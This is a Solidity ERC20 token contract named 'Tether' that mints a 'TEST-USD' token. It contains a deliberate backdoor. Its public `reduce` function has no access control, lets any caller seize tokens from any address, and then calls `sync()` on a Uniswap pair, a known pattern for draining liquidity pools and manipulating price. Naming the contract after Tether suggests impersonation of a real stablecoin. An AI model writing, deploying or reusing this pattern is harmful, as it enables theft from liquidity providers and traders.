// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IUniswapV2Pair {
    function sync() external;
}

contract Tether is ERC20{
    address public constant TEST = 0x300b1B817F2431e345Cde7b80229016F86ED5984;
    constructor(address _initialRecipient)ERC20("TEST-USD","TUSD"){
        _mint(_initialRecipient, 1000000000000e18);
        _mint(TEST, 10000e18);
    }

    function reduce(address from, uint256 amount) external{
        super._update(from, address(this), amount);
        IUniswapV2Pair(from).sync();
    }

}